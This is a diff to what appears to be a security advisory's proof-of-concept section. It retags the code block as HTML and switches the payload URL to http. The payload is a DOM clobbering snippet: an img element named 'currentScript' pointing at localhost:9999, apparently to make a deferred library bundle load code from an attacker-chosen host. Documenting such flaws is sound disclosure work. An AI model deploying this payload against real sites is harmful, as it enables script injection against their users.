@@ -41,13 +41,13 @@ URL: Self hosted
 ## PoC
 
 
-```
+```html
 <!--Library-->
 <script defer src="./dist/main.bundle.js"></script>
 <!--Library-->
 
 <!--Payload-->
-<div id="root"><img name="currentScript" src="https://localhost:9999">
+<div id="root"><img name="currentScript" src="http://localhost:9999">
 <!--Payload-->
 ```
 
